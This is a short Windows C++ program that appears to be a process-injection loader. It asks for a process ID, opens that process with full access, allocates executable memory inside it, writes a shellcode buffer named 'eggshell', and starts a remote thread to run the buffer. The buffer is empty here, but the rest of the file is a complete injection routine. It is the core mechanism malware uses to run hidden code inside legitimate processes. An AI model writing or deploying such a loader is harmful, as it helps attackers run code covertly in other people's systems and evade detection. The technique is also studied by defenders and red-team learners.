#include<iostream>
#include<windows.h>

using namespace std;

int main(){
    DWORD PID;
    HANDLE hProcess, hThread;
    LPVOID allocated_mem;
    
    unsigned char eggshell[]="";

    cout << "Enter process ID:";
    cin >> PID;

    //open process
    hProcess=OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (hProcess==0)
    {
        cout<<"failed to get process handle";
        return 1;
    }
    cout<<"process handle has been gotten successfully";
    //allocate process to memory
    allocated_mem=VirtualAllocEx(hProcess, 0, sizeof(eggshell), (MEM_COMMIT|MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    if(allocated_mem==0){
        cout<<"failed to allocate memory to process"<<GetLastError()<<endl;
        CloseHandle(hProcess);
        return 1;
    }
    cout<<"memory has been allocated successfully";
    if(!WriteProcessMemory(hProcess, allocated_mem, eggshell, sizeof(eggshell), 0)){
        cout<<"failed write process to memory"<<GetLastError()<<endl;
        VirtualFreeEx(hProcess, allocated_mem, 0, MEM_RELEASE);
        return 1;
    }
    cout<<"process has been written to memory";
    hThread=CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)allocated_mem, 0, 0, 0);
    if(hThread==0){
        cout<<"failed to create thread"<<GetLastError()<<endl;
        CloseHandle(hProcess);
        return 1;
    }
    cout<<"the thread has been created";

    cout<<"waiting for thread to finish executing";
    WaitForSingleObject(hThread, INFINITE);
    cout<<"thread finished executing"; 

    cout<<"cleaning up"<<endl;
    VirtualFreeEx(hProcess, allocated_mem, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    cout<<"finished cleaning up"<<endl;

    return 0;
}